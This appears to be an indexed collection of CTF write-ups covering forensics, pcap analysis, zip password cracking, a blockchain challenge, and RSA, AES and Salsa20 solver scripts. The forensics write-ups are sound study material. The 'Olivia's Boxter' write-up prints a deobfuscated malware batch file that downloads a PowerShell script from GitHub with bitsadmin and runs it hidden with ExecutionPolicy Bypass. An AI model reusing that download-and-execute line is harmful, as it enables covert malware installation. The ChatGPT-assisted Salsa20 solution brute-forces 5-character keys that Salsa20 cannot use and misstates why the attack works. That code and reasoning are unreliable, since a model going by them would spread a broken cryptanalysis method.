object</p>"},{"location":"ctf/2023/gctf-2023/wireshark-2/#description","title":"Description","text":"<p>I remember there is a compressed file. Please find it and expose the secret! Same challenge file as Wireshark #1.</p>"},{"location":"ctf/2023/gctf-2023/wireshark-2/#solution","title":"Solution","text":"<p>Challenge description mentioned file, so we can try to search for objects in the export section.</p> <p></p> <p><code>File</code> --&gt; <code>Export Objects</code> --&gt; <code>HTTP</code></p> <p>We chose to export HTTP objects as we can see that there are HTTP protocols in the packets. You can always choose other protocols to see whether there are any other objects transferred. However, the most common one is HTTP.</p> <p></p> <p>Given hint is compressed file, we know that we need to focus on the zip file. We can then choose the <code>secret.zip</code> file and save it.</p> <p></p> <p>However, the zip file is not able to be extracted or unzipped as it is corrupted. It is shown that the end-of-central-directory is not found.</p> <p></p> <p>After some research, we found the signature of the corrupted part.</p> <p><pre><code>hexedit secret.zip\n</code></pre> </p> <p>Edit the corrupted part with the correct signature and the zip file will be fixed.</p> <p></p> <p>However, the zip file requires a password. The string in secret.txt did not work out for it. Therefore, we thought of bruteforcing the password.</p> <p><pre><code>zip2john secret.zip &gt; secret.hash\n</code></pre> Use <code>zip2john</code> to generate hash for the zip file.</p> <p><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash\n</code></pre> Then, use John the Ripper tool to bruteforce the password using <code>rockyou.txt</code> wordlist.</p> <p></p> <p>The zip file password will be cracked successfully and the password is <code>batman</code>.</p> <p></p> <p>Upon submitting the correct password, it will give us a file named \u201cflag\u201d. View it and get the flag.</p>"},{"location":"ctf/2023/gctf-2023/wireshark-2/#flag","title":"Flag","text":"<p><code>GCTF2023{C0rrupted_Z1p_f1l3s}</code></p>"},{"location":"ctf/2023/goh-2023/about/","title":"[ About ]","text":"<ul> <li>CTF Name: Game of Hackers (GOH) 2023</li> <li>Organizer: Universiti Kuala Lumpur (UniKL MIIT) &amp; Nexagate</li> <li>Description: It is a beginner-friendly CTF competition.</li> </ul> Category Challenge Name Forensics The Realm of Eerie-Area Forensics Clone"},{"location":"ctf/2023/goh-2023/clone/","title":"Clone","text":"<p>Windows event log analysis</p>"},{"location":"ctf/2023/goh-2023/clone/#description","title":"Description","text":"<p>We noticed some weird traffic coming from our PC. That led us to believe that our host was compromised. After a quick investigation, our fear was confirmed. We believe that the malicious actor used rclone to exfiltrate the research to the cloud. Can you detect the usage of rclone from the event logs produced? To get the flag, you need to connect to the web service and answer all the questions correctly.</p> <p><code>nc 10.0.2.202 13000</code> Attachment: <code>forensic_Clone_attachment.zip</code></p>"},{"location":"ctf/2023/goh-2023/clone/#solution","title":"Solution","text":"<p>We were given a zip file with a lot of <code>.evtx</code> files, which are event log files. We were given a clue that the malicious actor used rclone and we need to detect the usage of rclone.  Question mentions that we need to find logs related to rclone, we thought of searching for the sysmon event log. Sysmon event logs are the event logs created by Microsoft System Monitor (sysmon). These event logs provide information about system-level operations on Windows. Activities like network connections, file and registry modifications, and process initiation are all recorded in these event logs (source). We can use this tool to dump the sysmon evtx file and parse it into text file. <pre><code>./dumpevtx parse /path/to/Microsoft-Windows-Sysmon%4Operational.evtx | tee sysmon.txt\n</code></pre> But first, let us connect to the web service and see what is the first question.</p>"},{"location":"ctf/2023/goh-2023/clone/#1-what-is-the-email-of-the-attacker-used-for-the-exfiltration-process-example-nameemailcom","title":"1. What is the email of the attacker used for the exfiltration process? (example: name@email.com)","text":"<p>To search for email values, we can open the file that we parsed (sysmon.txt) in a text editor, and search for \"@\" as all the emails must contain this symbol.</p> <p> The email can be found in \"CommandLine\" section, which is the command ran by the malicious actor.   Answer: <code>nacover969@mitigado.com</code></p>"},{"location":"ctf/2023/goh-2023/clone/#2-what-is-the-password-of-the-attacker-used-for-the-exfiltration-process","title":"2. What is the password of the attacker used for the exfiltration process?","text":"<p>From the same output as previous question, we can see there is a password section after the word pass.</p> <p> It shows that the password is <code>#S1*dX\\u00262sA@9</code>. However, when we submit the password to the web service, it shows that the answer is wrong. After some research, we figured out that there is a unicode character in the password.</p> <p> According to the unicode table where you can find it online, <code>\\u0026</code> represents the symbol \"&amp;\". Therefore, the final password would be <code>#S1*dX</code> + <code>&amp;</code> + <code>2sA@9</code>.   Answer: <code>#S1*dX&amp;2sA@9</code></p>"},{"location":"ctf/2023/goh-2023/clone/#3-what-is-the-cloud-storage-provider-used-by-the-attacker","title":"3. What is the Cloud storage provider used by the attacker?","text":"<p>From the same output as question 1, \"CommandLine\" shows that the malicious actor is using rclone to create remote <code>mega</code> user.   Answer: <code>mega</code></p>"},{"location":"ctf/2023/goh-2023/clone/#4-what-is-the-id-of-the-process-used-by-the-attackers-to-configure-their-tool","title":"4. What is the ID of the process used by the attackers to configure their tool?","text":"<p>The tool mentioned here is rclone. Therefore, by searching for \"rclone.exe\", we will be able to see the ID of the process.</p> <p> Answer: <code>1416</code></p>"},{"location":"ctf/2023/goh-2023/clone/#5-what-is-the-name-of-the-folder-the-attacker-exfiltrated-provide-the-full-path-format-cpathtofolder","title":"5. What is the name of the folder the attacker exfiltrated; provide the full path. (format: C:/path/to/folder/)","text":"<p>In the same output as question 4, we can see that the malicious actor is trying to execute the command as we can see in \"CommandLine\" section. The exfiltrated folder is the folder that is being copied by the malicious actor.</p> <p> Answer: <code>C:/Users/pakya/OneDrive/Desktop/SecretFiles/</code></p>"},{"location":"ctf/2023/goh-2023/clone/#6-what-is-the-name-of-the-folder-the-attacker-exfiltrated-the-files-to","title":"6. What is the name of the folder the attacker exfiltrated the files to?","text":"<p>In the same output in question 5, we can see that the destination is <code>remote:v1ct1m_arEea</code>.</p> <p> Answer: <code>v1ct1m_arEea</code></p>"},{"location":"ctf/2023/goh-2023/clone/#flag","title":"Flag","text":"<p>I forgot to copy and save the flag. But upon answering all questions correctly, we should be able to receive a flag sent by the web service in the format of <code>gohunikl2023{flag}</code>.</p>"},{"location":"ctf/2023/goh-2023/clone/#resources","title":"Resources","text":"<ul> <li>https://forensicskween.com/ctf/hack-the-box/htb-cyber-apocalypse-2023-forensics/</li> </ul>"},{"location":"ctf/2023/goh-2023/realm/","title":"The Realm of Eerie-Area","text":"<p>PCAP analysis</p>"},{"location":"ctf/2023/goh-2023/realm/#description","title":"Description","text":"<p>In this mysterious realm, a malevolent force is at play. Uncover the hidden malevolence within. Figure out the dark secrets the area holds.</p> <p>Attachment: <code>eerie-area.pcapng</code></p>"},{"location":"ctf/2023/goh-2023/realm/#solution","title":"Solution","text":"<p>The challenge description does not provide any hint. My first approach for all pcap challenges is to go to <code>Statistics &gt; Protocol Hierarchy</code> to have an overview of the challenge by looking through the protocols involved in the traffic.</p> <p></p> <p>Normally, if there's text data, there might be some juicy info there. Right click <code>Line-based text data</code>, then click <code>Apply as Filter &gt; Selected</code> to apply it as filter to view it.</p> <p></p> <p>It is a 404 Not found message. When I saw 404, I thought that I was in a wrong path. However, I chose to further analyze it first so that I won't miss any important thing. Right click the packet, then <code>Follow &gt; TCP Stream</code> to view it in a better way.</p> <p></p> <p>Red denotes request sent by client, while blue denotes response received from server. In the first line, we can see that the client is using <code>GET</code> request to get something with a weird name. It looks like encoded string or cipher, so I tried to copy it and decode it.</p> <p></p> <p>By using CyberChef, we will then get the decoded string, which appears to be a link to download another file named <code>boo.exe</code>.</p> <p></p> <p>It appears to be a gzip file instead of an exe file.</p> <p></p> <p>Once extracted, it shows a directory with another exe file inside, and the filename seems like the flag.</p> <p></p> <p>However, it is again not an exe file, but text instead. Viewing the contents in the file reveals the real flag to us.</p>"},{"location":"ctf/2023/goh-2023/realm/#flag","title":"Flag","text":"<p><code>gohunikl2023{p3ek_4_&amp;0o}</code></p>"},{"location":"ctf/2024/gctf-2024/about/","title":"[ About ]","text":"<ul> <li>CTF Name: Girls in CTF 2024 </li> <li>Organizer: RE:HACK &amp; RE:UNION</li> <li>Description: It is a women-only CTF competition that aims to identify the local female talents in cybersecurity, open to public.</li> </ul> Category Challenge Name Blockchain Allowance Cryptography Warmup Salsa Sauce Cryptography Warmup Cipher Cryptography Overflow Resources Forensics QNA Forensics Fox Secrets Forensics Olivia's Boxter Forensics Stop Slacking Off Forensics MFTBasics Misc I Forgot Misc Find Me 1 Misc Find Me 2 Misc DevOps 101 Misc Dev(Sec?)Ops RE Phone Siapa Ni? RE Gopher-chan Web Rainbow I Web Rainbow II Pwn Ret2Win I"},{"location":"ctf/2024/gctf-2024/blockchain/allowance/","title":"Allowance","text":""},{"location":"ctf/2024/gctf-2024/blockchain/allowance/#description","title":"Description","text":"<p>This challenge is solved by my teammate, <code>Jin_707</code>. This writeup is written by <code>Jin_707</code>.</p>"},{"location":"ctf/2024/gctf-2024/blockchain/allowance/#solution","title":"Solution","text":"<p>  At first to spawn up our instance, use the <code>curl</code> command given and get the token(?)  I'm not sure and input into the web app, then an instance will be spawned.   At first we get two files for this challenge which is the <code>setup.sol</code>, and <code>gurl.sol</code>. <code>gurl.sol</code> shows that a passphrase is needed, but it was hashed with keccak256, with the strings exposed to us \"warlocksmurf wants your ethereum\"  hence we can get the passphrase hash with <pre><code>cast keccak256 \"warlocksmurf wants your ethereum\"\n</code></pre> The cast function is in foundry library so need to install beforehand.  Then the after job are all left to ChatGPT :P   The structure is: <pre><code>cast send --rpc-url &lt;RPC_URL&gt;  --private-key &lt;Private_Key&gt; \\\n&lt;Gurl_Contract_Address&gt; \\\n\"claim(bytes32)\" &lt;CALCULATED_PASSPHRASE&gt; --value 0.01ether\n</code></pre></p> <p> can be retrieved with (if not mistaken) <pre><code>cast call --rpc-url &lt;RPC_URL&gt;  &lt;Setup_Contract&gt; \"challengeInstance()\"\n</code></pre> <p>Example: <pre><code>cast call --rpc-url \"http://3.1.25.253:48334/c8f70cdf-531b-4a26-90aa-084f7a235268\" 0x96C00Add89E8CfCf9A24ebaC87F451320e36109D \"challengeInstance()\"\n</code></pre></p> <p>Final payload: <pre><code>cast send --rpc-url \"http://3.1.25.253:48334/c8f70cdf-531b-4a26-90aa-084f7a235268\" --private-key \"0x706a4b015198be83bb202233599aeeb05154df1c857fcbd8fed8dacb1f028113\" \\ 0xb9faff827508b69964f2d7d3b2cd8472b45a7d62 \\\n\"claim(bytes32)\" 0x664d69aa67c4e6ca7b6b9b5a6e89b9bd5ff0e22b21211b244d0f80dce07c1bf3 --value 0.01ether\n</code></pre></p> <p></p>"},{"location":"ctf/2024/gctf-2024/crypto/overflow-resources/","title":"Overflow Resources","text":""},{"location":"ctf/2024/gctf-2024/crypto/overflow-resources/#description","title":"Description","text":"overflow.py<pre><code>from Crypto.Util.number import getPrime, bytes_to_long as b2l\nfrom secret import flag\nimport random\n\nm_1 = flag[:36]\nm_2 = flag[36:]\n\ne_list = [91, 97]\n\ndef main():\n    for i in range(200):\n\n        p, q = getPrime(1024), getPrime(1024)\n        n = p*q\n\n        e = random.choice(e_list)\n\n        if e == 91:\n            c = pow(b2l(m_1), e, n)            \n        else:\n            c = pow(b2l(m_2), e, n)\n\n        with open('out.txt','a+') as f:\n            f.write(f\"[{e}, {n}, {c}]\\n\")\n\nif __name__ == '__main__':\n    main()\n</code></pre> out.txt<pre><code>[91, 14983214299066891061758447907449734031591479401128110319949374461118770551678260191839572082804349761512767318894967010228984909916341049249372312579328145999879843259939716585996895193476087662072761717845396714667587138238070652587777938480062286892034492696138939826635626536213397079816184344818701332417040993543251638010610799732264502641538422724621617985705649419671506540412576508561554234295096373970634306474965431323943669392641068817463384789589392395503251719627006438801852992070056199952903701767640494504118651826768705789289672322282090103023185725143556966997097340296482973615728612033222504687627, 9848550218070250281313731844475223533302037268897308471790223719108618142981536047970286689350810234407355365853957569950091166640040981374424971066265130432074910895250103525973705712597736245392043801098618781288153458786032521561882004009669816537147719828763071320853700521249885717668958189557361081921448433813313053960676083547476139339699167996920379764770648302157346661532135205703823515844714964210295870102905156759257014265986334863138093414295224935121219307447074862542432386632420663802893271413110548146586006916146408106291427967881880343674332553133850725333728855028825529234005866493025628378567]\n[97, 18918511242758369274135583040906234072739777081293824831822290419046394521075004241044392837591457688093656177294970319760915956949626302560112140916289867297798535449423453652808753056883116291122634842893812257751852158797771835165279266215601549942265586281327781869763218534671861542494546852729864694245748555489344761104133931610491821269226322466425326440166168962575646847219325887362601770077560870025177332382912244790498458050378578548988123926823833296250770307086310450945513831278245702856258526674103142039819512898528151992858996859731873672568668916632785112586424198588691632068716925901053977994803, 1111854131923152121778411823885080618496516431832170019729885596456453070819653848026418896658511719640129789446227771539544436772954090934062758582886032431577449158533883509555624889697372225574602837709404946003355721678126053739295416358062826997957551509997889330076325183135155928289937098358872658400667835632503636506841042431125533820898161002908227732376121702712623625863693261860472084133300080315245448195998064682296385149915828369342573512858682215282907138773991213797145511618904555424813028567873972616040757844536803643740005454831877610542748203108337227406625687987978050019556553283326380929133]\n[97, 17198276324255329813384900915667407243447833858554762249089628756428192629251347632199931988065605821443721449248775346607605092850087601432414079750820836389742459443001561727120135769645466942152683796909664708588308264964371003928291839293419137364014351955179721401731084646969965841913974814816490366160495071445193988296480456766915756053513916780673158468856832446841612264994048349113565616232255060165322624612667869601632165158251257526339645522222676877213662544796128628594805767864838598868471685970028451605471976440499496598318184049478553846994038346783472931384395961528204222662295835110316818936613, 4561934652288509820923329534569431945174543724388366377557985525195392678023166325769852355332497253352722628786040321200870175247067447556959970319247552938816045061507023191275279325866450910270661126820518008930860256221015303365587398054889718520099535555986357360629681116378542956908222790760876232230583309161647304697721585235124846656512305569283147060480515786385328932651904700266719765939265417787796117615712789749738719506558641434407761610060486945914017582475367893999851213581497278168216903275002469441661114390284426076248514984032723501885378126814559296326889758573003372553845280614364206038324]\n...\n-TRUNCATED-\n</code></pre>"},{"location":"ctf/2024/gctf-2024/crypto/overflow-resources/#solution","title":"Solution","text":"<p>This challenge involves the help of ChatGPT  Based on the hint given, we can choose the correct method to decrypt.  </p> <pre><code>from sympy import Integer, integer_nthroot\nfrom sympy.ntheory.modular import crt  # Correct import for CRT\nfrom Cryptodome.Util.number import long_to_bytes as l2b\nimport re\n\n# File containing the RSA outputs\nfile_path = 'out.txt'\n\n# Function to parse the file and gather ciphertexts with the same exponent\ndef parse_rsa_data(file_path):\n    rsa_data = []\n\n    # Regular expression to parse each line\n    pattern = r'\\[(\\d+), (\\d+), (\\d+)\\]'\n\n    # Read the RSA data from the file\n    with open(file_path, 'r') as file:\n        data = file.readlines()\n\n    # Parse each line and extract e, n, and c\n    for line in data:\n        match = re.match(pattern, line.strip())\n        if match:\n            e = int(match.group(1))\n            n = Integer(match.group(2))\n            c = Integer(match.group(3))\n            rsa_data.append((e, n, c))\n\n    return rsa_data\n\n# Function to perform the CRT-based attack\ndef crt_attack(rsa_data, e):\n    # Filter all ciphertexts with the same exponent e\n    n_list = []\n    c_list = []\n    for entry in rsa_data:\n        if entry[0] == e:  # Only consider entries with the same exponent\n            n_list.append(entry[1])\n            c_list.append(entry[2])\n\n    if len(n_list) &lt; 2:  # We need at least two ciphertexts to apply CRT\n        print(f\"Not enough ciphertexts with exponent {e} to perform CRT.\")\n        return None\n\n    # Use the Chinese Remainder Theorem to combine the ciphertexts and moduli\n    combined_c, combined_n = crt(n_list, c_list)\n    if combined_c is None or combined_n is None:\n        print(\"CRT failed.\")\n        return None\n\n    # Now, try to take the e-th root of the combined ciphertext\n    m, exact = integer_nthroot(combined_c, e)\n    if exact:\n        return int(m)\n    else:\n        print(\"Failed to compute exact e-th root.\")\n        return None\n\n# Function to convert long integers (plaintexts) to byte representation\ndef convert_to_bytes(plaintext):\n    try:\n        byte_rep = l2b(plaintext)\n        print(f\"Recovered bytes: {byte_rep}\")\n    except ValueError:\n        print(f\"Could not convert {plaintext} to bytes.\")\n\n# Main function to run the attack\nif __name__ == \"__main__\":\n    # Step 1: Parse the RSA data\n    rsa_data = parse_rsa_data(file_path)\n\n    # Step 2: Attempt CRT-based attack for each exponent\n    for e in [91, 97]:  # Consider both exponents\n        print(f\"\\nAttempting CRT attack with exponent {e}...\")\n        recovered_plaintext = crt_attack(rsa_data, e)\n\n        # Step 3: If a plaintext was recovered, convert it to bytes\n        if recovered_plaintext:\n            print(f\"Recovered plaintext (in long integer form): {recovered_plaintext}\")\n            print(\"\\nConverting to bytes...\\n\")\n            convert_to_bytes(recovered_plaintext)\n        else:\n            print(f\"No plaintext recovered for exponent {e}.\")\n</code></pre> <p></p>"},{"location":"ctf/2024/gctf-2024/crypto/warmup-cipher/","title":"Warmup Cipher","text":""},{"location":"ctf/2024/gctf-2024/crypto/warmup-cipher/#description","title":"Description","text":"encrypt.py<pre><code>from hashlib import sha256\nimport string, random\nfrom secret import MASTER_KEY, FLAG\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\nSET = string.printable[:62] + '~!@#$%^&amp;*'\n\ndef genRandpass():\n    master_key = int.from_bytes(MASTER_KEY, 'little')\n    randpass = ''\n\n    while master_key:\n        bit = master_key &amp; 1\n        if bit:\n            randpass += random.choice(SET[:len(SET)//2])\n        else:\n            randpass += random.choice(SET[len(SET)//2:])\n        master_key &gt;&gt;= 1\n\n    return randpass\n\ndef main():\n    randpass = genRandpass()\n    encryption_key = sha256(MASTER_KEY).digest()\n    cipher = AES.new(encryption_key, AES.MODE_ECB)\n    ciphertext = cipher.encrypt(pad(FLAG, 16))\n\n    with open('out.txt', 'w') as f:\n        f.write(f'Your randpass : {randpass}\\n')\n        f.write(f'Encrypted Flag : {ciphertext.hex()}')\n\nif __name__ == '__main__':\n    main()\n</code></pre> out.txt<pre><code>Your randpass : v@BV4oHAbKP$hxK&amp;qWDGysRAWHZJpj!zPW&amp;Pkj^!&amp;NEGq8&amp;#EUQ~tlCIgZXzc3JQD*YJa1YYt#N&amp;odTZASRGu5!UAWUItd*OfAFPqvZIkPIWb6U!jIT~nh%zO!V!w5T~BEXAab*A^EPP3gDYIRGGio$&amp;&amp;GT$exR^aFYAan@OKzJIxmz#RNTJejHPhC%B84FDYD%Kh1FHM@^B9jWKPXVB60OXTAE*d7~OGN%#yt~KCQIz23**FKD&amp;5iWZ#&amp;EMipK&amp;~G&amp;N7iFWRJRLv5K^%@*~pgINbG*CpyYSbJJRopQZDX@~5bVLzJFOoiQDERIM8xSMjIEGviGHlIJNj3IA%#MGa2^NoQC@7yA!l^TEvrHOD$P*yy@JE%zVfsI^2KZ%j1!GS^WAxuT*zCAPuaVNxUJQnhJ~CFNJ3cD$KJDDcq@AIL$BeuSCGMDL9fIF4E%Zpv&amp;TeI%zvlMDaVF!a9PB4DBP66I%5@~Rce~C3Q!*jtTZo~T~2cA%cTIV5u~^lX!LhxQK#Z##swCFpG&amp;GyiQKd~USm2CTb^Iz0qzYMzQTwkB#PRHIslUFM#S~dfNHc!SOlj&amp;Ct@$IpbD&amp;^X%Reu^J!HJXe0GJPzY&amp;7rT#1@JEy1RP*@!Tv9BMpEzUy4UQ2$NIctM$jIIV08!!C^Z~23TUlNH@cxNXrLZVfnAV3MWYph\nEncrypted Flag : 6159896fa4241f271807fb20645c98d03166742795e13a9904ca21df34c9fa7ee2721bffb5aa0ba60f9798edaa0c4684af558312db93c5d27c22ad3f778ff019\n</code></pre>"},{"location":"ctf/2024/gctf-2024/crypto/warmup-cipher/#solution","title":"Solution","text":"<p>This challenge involves the help of ChatGPT <pre><code>import string\nfrom hashlib import sha256\nfrom Cryptodome.Cipher import AES\nfrom Cryptodome.Util.Padding import unpad\n\n# Provided randpass from out.txt\nrandpass = \"v@BV4oHAbKP$hxK&amp;qWDGysRAWHZJpj!zPW&amp;Pkj^!&amp;NEGq8&amp;#EUQ~tlCIgZXzc3JQD*YJa1YYt#N&amp;odTZASRGu5!UAWUItd*OfAFPqvZIkPIWb6U!jIT~nh%zO!V!w5T~BEXAab*A^EPP3gDYIRGGio$&amp;&amp;GT$exR^aFYAan@OKzJIxmz#RNTJejHPhC%B84FDYD%Kh1FHM@^B9jWKPXVB60OXTAE*d7~OGN%#yt~KCQIz23**FKD&amp;5iWZ#&amp;EMipK&amp;~G&amp;N7iFWRJRLv5K^%@*~pgINbG*CpyYSbJJRopQZDX@~5bVLzJFOoiQDERIM8xSMjIEGviGHlIJNj3IA%#MGa2^NoQC@7yA!l^TEvrHOD$P*yy@JE%zVfsI^2KZ%j1!GS^WAxuT*zCAPuaVNxUJQnhJ~CFNJ3cD$KJDDcq@AIL$BeuSCGMDL9fIF4E%Zpv&amp;TeI%zvlMDaVF!a9PB4DBP66I%5@~Rce~C3Q!*jtTZo~T~2cA%cTIV5u~^lX!LhxQK#Z##swCFpG&amp;GyiQKd~USm2CTb^Iz0qzYMzQTwkB#PRHIslUFM#S~dfNHc!SOlj&amp;Ct@$IpbD&amp;^X%Reu^J!HJXe0GJPzY&amp;7rT#1@JEy1RP*@!Tv9BMpEzUy4UQ2$NIctM$jIIV08!!C^Z~23TUlNH@cxNXrLZVfnAV3MWYph\"\n\n# Character set used in the code\nSET = string.printable[:62] + '~!@#$%^&amp;*'\n\n# Split the set into first half and second half\nhalf_len = len(SET) // 2\nfirst_half = SET[:half_len]  \nsecond_half = SET[half_len:] \n\n# Reverse the process of generating randpass to get the MASTER_KEY bits\nmaster_key_bits = []\n\nfor char in randpass:\n    if char in first_half:\n        master_key_bits.append(1)  \n    elif char in second_half:\n        master_key_bits.append(0)  \n    else:\n        raise ValueError(\"Character not in SET\")\n\n# Convert the bits back to an integer by reversing the bit order\nmaster_key = 0\nfor bit in reversed(master_key_bits):\n    master_key = (master_key &lt;&lt; 1) | bit\n\n# Convert the integer MASTER_KEY to hexadecimal format\nmaster_key_hex = hex(master_key)\n\n# Print the derived MASTER_KEY in hex format\nprint(\"MASTER_KEY (hex):\", master_key_hex)\n\n# Encrypted flag from out.txt\nencrypted_flag_hex = '6159896fa4241f271807fb20645c98d03166742795e13a9904ca21df34c9fa7ee2721bffb5aa0ba60f9798edaa0c4684af558312db93c5d27c22ad3f778ff019'\n\n# Convert the master key from hex to bytes\nmaster_key_bytes = master_key.to_bytes((len(master_key_hex) - 2) // 2, byteorder='little')\n\n# Derive the encryption key using SHA-256\nencryption_key = sha256(master_key_bytes).digest()\n\n# Convert the encrypted flag from hex to bytes\nencrypted_flag_bytes = bytes.fromhex(encrypted_flag_hex)\n\n# Decrypt the flag using AES in ECB mode\ncipher = AES.new(encryption_key, AES.MODE_ECB)\ndecrypted_flag_padded = cipher.decrypt(encrypted_flag_bytes)\n\n# Remove padding to get the original flag\ndecrypted_flag = unpad(decrypted_flag_padded, 16)\n\n# Print the decrypted flag\nprint(\"Decrypted Flag:\", decrypted_flag.decode())\n</code></pre> This encryption script basically uses a master key to encrypt the flag. The <code>genRandpass()</code> function generates a random password based on the master key, while The <code>main()</code> function uses a random generated password to encrypt the flag using AES. The variable named <code>SET</code> defines the characters used for random password generation.   Therefore, we deduce that we can the <code>MASTER_KEY</code> by reversing the <code>genRandpass()</code> function as we already have the random password. This is because the password is generated by shifting through the bits of the MASTER_KEY. For each bit:</p> <ul> <li>If the bit is 1, a character is selected from the first half of <code>SET</code>.</li> <li>If the bit is 0, a character is selected from the second half of <code>SET</code>.</li> </ul>"},{"location":"ctf/2024/gctf-2024/crypto/warmup-salsa-sauce/","title":"Warmup Salsa Sauce","text":""},{"location":"ctf/2024/gctf-2024/crypto/warmup-salsa-sauce/#description","title":"Description","text":"wss.py<pre><code>from Crypto.Cipher import Salsa20\nfrom secret import FLAG\nfrom secrets import token_bytes as tb\n\ndef encText(text, key, nonce):\n    cipher = Salsa20.new(key=key, nonce=nonce)\n    ciphertext = cipher.nonce + cipher.encrypt(text)\n    return ciphertext\n\nif __name__ == \"__main__\":\n    text = b\"We covered the drugs with our favourite salsa sauce. The stupid cops will not find it.\"\n\n    key, nonce = tb(32), tb(8)\n\n    enc_text = encText(text, key, nonce)\n    enc_flag = encText(FLAG, key, nonce)\n\n    with open('out.txt','w') as f:\n        f.write(f\"Encrypted flag: {enc_flag.hex()}\\n\")\n        f.write(f\"Encrypted text: {enc_text.hex()}\")\n</code></pre> out.txt<pre><code>Encrypted flag: fa1c26b66ad926ab75cd51524f05ec08f7f3160c74bec57f8aec3f7cace6fbb7370923e8c540673f657dada9e9540101d7f4dc0b6627f147fc47627a244c88b2ea6c3340\nEncrypted text: fa1c26b66ad926ab45cb05575b0ab90fcdf1060d72bfba6f90aa076cbcf2f3aa311a13fc800638382570bcbee142001290f1d41d3761e315b91730663c2cd8e1fe7a25482ce0cd69745028635ef5dae54282f162e448fec5f6b0e7d8ff85\n</code></pre>"},{"location":"ctf/2024/gctf-2024/crypto/warmup-salsa-sauce/#solution","title":"Solution","text":"<p>This challenge involves the help of ChatGPT <pre><code>from Crypto.Cipher import Salsa20\nimport itertools\nimport string\n\ndef decText(ciphertext, key):\n    nonce = ciphertext[:8]  # The first 8 bytes are the nonce\n    encrypted_message = ciphertext[8:]  # The rest is the actual encrypted message\n    cipher = Salsa20.new(key=key, nonce=nonce)\n    decrypted_message = cipher.decrypt(encrypted_message)\n    return decrypted_message\n\ndef brute_force(ciphertext, known_plaintext):\n    keyspace = string.ascii_letters + string.digits  # Alphanumeric characters\n    for key_candidate in itertools.product(keyspace, repeat=5):  # Adjust the length based on assumptions\n        key_candidate = ''.join(key_candidate).encode()  # Create the candidate key\n        try:\n            decrypted_text = decText(ciphertext, key_candidate)\n            if known_plaintext.encode() in decrypted_text:  # Check for known plaintext\n                print(f\"Key found: {key_candidate}\")\n                print(f\"Decrypted text: {decrypted_text.decode()}\")\n                break\n        except Exception:\n            continue  # Ignore decryption failures\n\nif __name__ == \"__main__\":\n    # Reading the encrypted data from the 'out.txt' file\n    with open('out.txt', 'r') as f:\n        lines = f.readlines()\n\n    # Extract the encrypted flag and text from the file\n    enc_flag_hex = lines[0].split(\"Encrypted flag: \")[1].strip()\n    enc_text_hex = lines[1].split(\"Encrypted text: \")[1].strip()\n\n    # Convert the hex strings to bytes\n    enc_text = bytes.fromhex(enc_text_hex)\n\n    # Known plaintext (a part of the original message)\n    known_plaintext = \"We covered the drugs with our favourite salsa sauce.\"\n\n    # Attempt brute-force decryption\n    brute_force(enc_text, known_plaintext)\n</code></pre> The vulnerability in the encrypting script is the repeating use of <code>key</code> and <code>nonce</code> for encrypting process. Therefore, we can create a script to brute force the encryption key in order to recover the original plaintext. It reads the encrypted data from a file, extracts the nonce, and generates possible 5-character keys from an alphanumeric set. For each candidate key, the script uses the nonce and key to decrypt the message with Salsa20. If the decrypted text contains a known portion of the original message, the correct key is identified. This process exploits the fact that the same key and nonce were reused for multiple messages, making brute-force attempts feasible.</p>"},{"location":"ctf/2024/gctf-2024/forensics/fox-secrets/","title":"Fox Secrets","text":""},{"location":"ctf/2024/gctf-2024/forensics/fox-secrets/#description","title":"Description","text":"<p>Challenge description hints that we need to find the password from Firefox. This might be the saved password of the user. The attachment given is an <code>ad1</code> file, so we need to use FTK Imager to open the file and navigate to Firefox file location.</p>"},{"location":"ctf/2024/gctf-2024/forensics/fox-secrets/#solution","title":"Solution","text":"<p> Through some research, we will know that the Firefox saved passwords are stored in these two files, located in the Firefox user profile: <pre><code>C:\\Users\\&lt;your Windows login username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\\n</code></pre></p> <p> However, all the usernames and passwords are encrypted.</p> <p> There are several tools online to decrypt it, the tool I used is this, which is found from a YouTube tutorial.</p>"},{"location":"ctf/2024/gctf-2024/forensics/mftbasics/","title":"MFTBasics","text":""},{"location":"ctf/2024/gctf-2024/forensics/mftbasics/#description","title":"Description","text":"<p>Information we got from the challenge title and description</p> <ul> <li>Title: it might be a basic MFT challenge</li> <li>Description: the flag might be in text file</li> <li>Attachment: only MFT file is given, so just focus on MFT</li> </ul>"},{"location":"ctf/2024/gctf-2024/forensics/mftbasics/#solution","title":"Solution","text":"<p>  By performing basic MFT parsing using MFTECmd, we found flag.txt. There is no other filename that looks like flag, or anything with flag format. Since we are not able to get the content of the text file from this result as it is just a basic parsing, we need to find other methods to get the content of the text file.   As shown, the file will be resident if it is small enough. It is called MFT resident and it is stored in MFT records. Since the flag is in the text file, it might be a MFT resident. We can also check the file size from the MFT record above.   Therefore, we can use MFTECmd again, but this time is to dump the MFT resident.   Get the entry number of the flag file from the CSV file that is exported.   Then, search through the MFT resident dump using its entry number and open in Notepad to see the file content.  </p>"},{"location":"ctf/2024/gctf-2024/forensics/olivias-boxter/","title":"Olivia's Boxter","text":""},{"location":"ctf/2024/gctf-2024/forensics/olivias-boxter/#description","title":"Description","text":""},{"location":"ctf/2024/gctf-2024/forensics/olivias-boxter/#solution","title":"Solution","text":"<p> Going through ICMP protocol, we can see some message there: \u201cBoss, i have hacked into someone computer. Let me try the new malware we developed here!\u201d </p> <p>  Going through the FTP stream we can see the attacker log in using FTP and and perform file transferring. </p> <p>  Looking the next stream would be the file that is transferred, which looks like an obfuscated batch file. We can search for batch deobfusctator online to get the content of the file </p> <p>OliRod.bat<pre><code>bitsadmin.exe /transfer \"78fb98208c7f6ee6c0ed7bf761e614eb\" https://raw.githubusercontent.com/6E3372/OliRod/main/Photo/Olivia.ps1 \\Olivia.ps1\n\npowershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND \"\\Olivia.ps1\" \n</code></pre> We can navigate to the GitHub link to download the PowerShell file named <code>Olivia.ps1</code>.   This file is also kind of obfuscated which makes it hard for us to understand the function. We need to read and understand the code within the function in order to know what is going on in this file.    Instead of understanding line by line and decoding it, we can just run the code using tio.run.  We can deduce that this PowerShell script is trying to download <code>OliviaRodrigo.exe</code> and rename it into random strings.    After downloading the file, using <code>strings</code> command we can guess that this might be a Python executable. Therefore, we can try to decompile it and get the source code.    Decompile the exe by using pyinstractor and decompyle++ so that we can get the source code back.  